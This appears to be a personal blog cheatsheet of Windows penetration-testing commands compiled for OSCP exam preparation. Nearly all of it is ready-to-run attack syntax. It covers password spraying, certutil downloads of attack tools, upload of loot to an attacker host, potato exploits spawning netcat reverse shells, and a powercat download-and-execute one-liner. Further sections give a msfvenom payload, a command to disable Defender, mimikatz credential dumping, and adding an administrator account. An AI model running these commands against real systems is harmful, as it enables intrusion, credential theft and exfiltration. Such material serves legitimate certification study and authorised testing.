---
title: "Fighting Windows Auto Win"
date: 2025-08-20 07:00:00 +0700
categories: [cybersecurity]
tags: ["Machine"]
disclaimer: "Cybersecurity notes on Arai Notes are ethical, educational, and defensive-focused. They are intended to improve safety, awareness, and responsible system administration."
render_with_liquid: false
notion_id: "3fc1d4b3b91780cea02aca1f30d94057"
notion_hash: "53f1db6d9d6b89de"
notion_edited: ""
---

# Windows Pentesting Notes

This page is about notes for red teaming or doing a machine. I put this cheatsheet together while prepping for the OSCP. Instead of scattering my notes across ten different files, I consolidated all my core tools, command syntax, and methodologies into one single reference page inside VS Code. It’s broken down into sections and  each section includes step-by-step checklists and essential commands so I don't miss basic vectors when the exam clock is running.

### Checklist Windows

1. nmap
2. check every port and run hydra or nxc spray
    1. snmp → snmpbrutewalk
    2. web ports → directory enum
    3. databases port → hydra spray
    4. SMB port → nxc spray, nmap scripts
    5. winrm, ssh, rdp → nxc spray some common 
    6. FTP → login anonymous, try to extract any files
    7. if there is unpopular ports just try to nc or telnet
3. Try to find some injection point vulnerabilities, more information, credentials, etc
    1. if get password, crack it then spray and pray the password 
    2. if got shell do basic enumeration
4. Got a Shell → basic enumeration → linpeas → analyze linpest 
5. credential theft, uncommon files
6. Try to find PE 
    1. another IP segment → lateral movement
    2. unaccessible web/ports → port forwarding
    3. another user try to escalate to that user
    4. task scheduler
    5. writable folder, writeable service run by admin, etc
    6. DLL hijacking

## 🔎 Nmap

- **Port scanning**

```bash
nmap -p- --max-retries 1 --max-scan-delay 20 -T4 -Pn -v --open -oN out.nmap --system-dns --stats-every 3s {ip_attack}
```

- **Service + Banner scan**

```bash
nmap -sCV -p$ports --open -oN v2out.nmap --system-dns --stats-every 2s {ip_attack}
```

---

## 🔐 Spraying with Hydra & NetExec

```bash
nxc smb {ip_attack} -u users.txt -p pass.txt
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 {ip_attack} smb
```

---

## 🩸 SharpHound & BloodHound

**Executable (exe)**

```powershell
cd \Windows\Tasks
certutil -f -urlcache http://{ip_local}:81/bloodhound-collectors/SharpHound.exe sharp.exe
.\sharp.exe -c all -output blood
```

**PowerShell (ps1)**

```powershell
cd \Windows\Tasks
certutil -f -urlcache http://{ip_local}:81/bloodhound-collectors/SharpHound.ps1 SharpHound.ps1
.\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "blood"
```

**Linux Host**

```bash
bloodhound-python --dns-tcp -ns {ip_attack} -d fluffy.htb -u 'user' -p 'password' -c all
```

---

## 🍃 WinPEAS

```powershell
cd \Windows\Tasks
certutil -f -urlcache http://{ip_local}:81/winPEASany_ofs.exe peas.exe
.\peas.exe log=peas.log
```

---

## 📤 File Transfer (Windows)

**Upload file**

- *Basic Parsing*

```powershell
"PUT","POST" | foreach {
    Invoke-WebRequest -Uri "http://{ip_local}:82/peas.log" -Method $_ -InFile ".\peas.log" -ContentType "application/octet-stream" -UseBasicParsing
}
```

- *No Parsing (safer for newer PowerShell)*

```powershell
"PUT","POST" | foreach {
    Invoke-WebRequest -Uri "http://{ip_local}:82/20250530142453_BloodHound.zip" -Method $_ -InFile ".\20250530142453_BloodHound.zip" -ContentType "application/octet-stream"
}
```

- *SMB File Transfer*

```bash
# On Kali
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# On target
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe C:\Windows\Tasks\
```

**Download file**

```powershell
certutil -f -urlcache <http://192.168.1.110:81/PEAS/winPEASany_ofs.exe> peas.exe
curl http://{ip_local}:81/JuicyPotato.exe -o JuicyPotato.exe
Invoke-WebRequest https://{ip_local}:81/PowerView.ps1 -OutFile PowerView.ps1
```

---

## 🔍 Manual Enumeration

```powershell
whoami /priv & whoami /all & whoami /groups
net localgroup administrators
systeminfo
cmd.exe /c "dir /a"
ipconfig /all
netstat -ano
powershell.exe /c "Get-Process"
schtasks /query /fo LIST /v
```

- **Check domain membership**

```powershell
systeminfo | findstr /B /C:"Domain"
```

- **Check OS version**

```powershell
ver
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ReleaseId
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
[Environment]::OSVersion.Version
wmic os get Caption,Version,BuildNumber
Get-CimInstance Win32_OperatingSystem | Select-Object Version
```

- **Installed programs**

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

- **Check service binaries**

```powershell
Get-CimInstance -ClassName win32_service |
    Select Name,State,PathName |
    Where-Object {$_.State -like 'Running'}
```

- **Runas**

```shell
runas /user:iamtheadministrator cmd
```

---

## 🔑 Privilege Escalation

**Whoami privs**

```powershell
whoami /priv
```

**Exploits**

```powershell
certutil -f -urlcache http://{ip_local}:81/GodPotato-NET4.exe GodPotato-NET4.exe
certutil -f -urlcache http://{ip_local}:81/nc.exe nc.exe
.\GodPotato-NET4.exe -cmd ".\nc.exe {ip_local} 6002 -e cmd"
.\JuicyPotato.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Tasks\nc.exe -e cmd.exe {ip_local} 6002" -t *
.\print.exe -i -c "\Windows\Tasks\nc.exe {ip_local} 6002 -e powershell"
.\sigma "nc.exe {ip_local} 443 -e powershell"
```

**Add user**

```powershell
.\sigma "net user dave4 lab /add"
.\sigma "net localgroup Administrators dave4 /add"
.\sigma "net localgroup \"Remote Desktop Users\" dave4 /add"
.\sigma "net localgroup {SID} dave4 /add"
```

---

## 💥 Payloads

**MSFVenom**

```bash
msfvenom -p windows/shell_reverse_tcp lhost={ip_local} lport=9443 -f exe -o Binary.exe
```

**PowerUp**

```powershell
certutil -f -urlcache http://{ip_local}:81/PowerUp.ps1 PowerUp.ps1
. .\PowerUp.ps1
Invoke-PrivEscAudit   # or Invoke-AllChecks
```

**Reverse Shells**

- Powercat:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{ip_local}:81/powercat.ps1'); powercat -c {ip_local} -p 4444 -e powershell"
```

- Netcat:

```powershell
nc.exe {ip_local} 443 -e powershell
```

---

## 🛡️ Windows Defender

```powershell
Get-MpComputerStatus
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## 🔓 Credential Dumping

- Mimikatz:

```powershell
.\mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "token::elevate" "lsadump::secrets" "exit"
```

- Cmdkey:

```powershell
cmdkey /list
```

- Lazagne:

```powershell
.\lazagne.exe all
```

- Search passwords:

```powershell
findstr /SIM /C:"password" *.txt *.vbs *.ini *.cfg *.config *.xml *.ps1 *.bat *.json > C:\Windows\Tasks\passsearch.txt
findstr /spin "password" *.*
```

---

## 📂 File Discovery

- **Users**

```powershell
Get-ChildItem -Path C:\Users\ -Include *.xml,*.vbs,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.pcap*,*.ini,*.cfg,*.config,*.ps1,*.bat,*.json,*.yml,*.yaml,*.rdp,*.vnc,*.cred -File -Recurse -ErrorAction SilentlyContinue
```

- **C:\\ root**

```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.vbs,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.pcap*,*.ini,*.cfg,*.config,*.json,*.yml,*.yaml,*.rdp,*.vnc,*.cred -File -Recurse -ErrorAction SilentlyContinue | Out-File -FilePath "C:\Windows\Tasks\out-files.txt" -Encoding UTF8
```

---

## 🔀 Port Forwarding

- `netsh`
- `chisel`
- `ligolo`

**Ligolo file transfer**

```bash
listener_add --addr 0.0.0.0:81 --to 127.0.0.1:81
listener_add --addr 0.0.0.0:82 --to 127.0.0.1:82
```

**Ligolo nc listener**

```bash
listener_add --addr 0.0.0.0:4141 --to 127.0.0.1:4141
nc -nvlp 4141   # on Kali
```

---

## 🖥️ RDP

```bash
xfreerdp3 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:{ip_local} /cert:ignore +clipboard
# Options
/cert:ignore /sec:rdp /sec:tls
```

---
